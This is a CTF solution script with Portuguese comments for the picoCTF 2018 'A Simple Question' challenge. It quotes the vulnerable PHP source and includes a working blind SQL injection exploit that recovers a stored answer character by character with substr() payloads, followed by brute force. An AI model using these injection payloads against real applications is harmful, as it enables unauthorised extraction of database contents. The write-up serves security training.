#------------------------------------------------------------------------------------------------
#Problema/CTF: A Simple Question
#Pontos: 650 pontos
#Resolução de: Joeru AKA:Joerito
#------------------------------------------------------------------------------------------------
#There is a website running at http://2018shell.picoctf.com:32635.
#Try to see if you can answer its question. 
#------------------------------------------------------------------------------------------------
#Análise da situação
#   - Uma Aplicação Web hospedada no IPv4:18.188.57.214 Porta:32635
#   
#   - Um Formulário com action para 'answer2.php' em Método POST
#       1 input com o name="answer"
#       1 input com o name="debug" value="0" type="hidden"
#       Fornecem também o source code do 'answer2.php' em '/answer2.phps'
#       Payload
#          <?php
#               include "config.php";
#               ini_set('error_reporting', E_ALL);
#               ini_set('display_errors', 'On');
#   
#               $answer = $_POST["answer"];
#               $debug = $_POST["debug"];
#               $query = "SELECT * FROM answers WHERE answer='$answer'";
#               echo "<pre>";
#               echo "SQL query: ", htmlspecialchars($query), "\n";
#               echo "</pre>";
#           ?>
#           <?php
#               $con = new SQLite3($database_file);
#               $result = $con->query($query);
#   
#               $row = $result->fetchArray();
#               if($answer == $CANARY)  {
#                   echo "<h1>Perfect!</h1>";
#                   echo "<p>Your flag is: $FLAG</p>";
#               }
#               elseif ($row) {
#                   echo "<h1>You are so close.</h1>";
#               } else {
#                   echo "<h1>Wrong.</h1>";
#               }
#           ?>
#
#       - A partir do source code é possivel reparar:
#           Um include do 'config.php'
#
#           Espera receber 2 valores dos inputs, a $_POST["answer"]; e $_POST["debug"];
#
#           Um query "SELECT * FROM answers WHERE answer='$answer'" que:
#               Podemos confirmar que existe uma tabela answers
#               E irá confirmar se o campo answer é igual a var $answer
#
#           Está a ser utilizado a versão 'SQLite3'
#
#           $row fica com resultado do fetch
#           E é iniciado testes boleanos:
#               se $answer == $CANARY se for True mostra a $FLAG
#               Senão se $row for True mostra uma string "<h1>You are so close.</h1>"
#               Senão mostra uma string "<h1>Wrong.</h1>"
#
#       - Vulnerabilidades
#           Structured Query Language Injection
#
#       - Métodos de Pentesting Utilizados
#           Blind Structured Query Language Injection
#           +
#           Bruteforce
#
#       -Métodos de prevenção contra Structured Query Language Injection
#           https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
#       -Métodos de prevenção contra Bruteforce
#           https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks
#
#------------------------------------------------------------------------------------------------
import requests #Para Realizar HTTP Requests
import string   #Para Realizar Bruteforce com a string de chars
import re       #Para Realizar Regular Expressions de forma a obter a flag do HTTP Request

class SQL:

    def __init__(self, DNS, Porta):

        self.DNS        =   str(DNS)
        self.Porta      =   str(':'+str(Porta))
        self.Pagina     =   '/answer2.php'
        self.Protocolo  =   'http://'
        self.URL        =   str(self.Protocolo+self.DNS+self.Porta+self.Pagina)
        self.Sessao     =   requests.session()

    def Injetar(self, injecao):

        print(self.URL)

        Dados_Form      =   {'answer':injecao, 'debug':0}
        HTTP_Resposta   =   self.Sessao.post(self.URL,Dados_Form)

        if 'You are so close' in HTTP_Resposta.text:
            return True
        
        elif 'Wrong' in HTTP_Resposta.text:
            return False

        elif 'Your flag is' in HTTP_Resposta.text:
            Flag = re.findall(r'\{(.*?)\}',HTTP_Resposta.text)
            return "picoCTF{"+Flag[0]+"}"

        else:
            print(HTTP_Resposta.text)


def exploit():
    SQL_ = SQL('2018shell.picoctf.com',32635)
    answer = ''

    #SQL_.Injetar(' OR 1=1 --') #TRUE
    #SQL_.Injetar(' OR 1=0 --') #FALSE

    for i in range(0,255,1):
        HTTP_Resposta = SQL_.Injetar("' OR 1=1 AND (SELECT length(answer) FROM answers)="+str(i)+" --")
        print(HTTP_Resposta,i)

        if HTTP_Resposta == True:
            tamanho_answer=i
            print('$len($answer) ==',i)
            break

    for i in range(1,tamanho_answer+1,1):#SQLite3 index começa no 1 xd
        for j in string.printable:#'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
            HTTP_Resposta = SQL_.Injetar("' OR 1=1 and (SELECT substr(answer,"+str(i)+",1) FROM answers) = '"+str(j)+"' --")
            print(HTTP_Resposta,'\n\nCaráter',str(j),'no $answer index:',i)

            if HTTP_Resposta == True:
                answer+=j
                print("Caráter encontrado:",str(j))
                break

    flag = SQL_.Injetar(answer)
    print("\n\n\t$answer:",answer,"\n\tFlag:",flag)
    

def main():
    exploit()

if __name__ == "__main__":
    main()
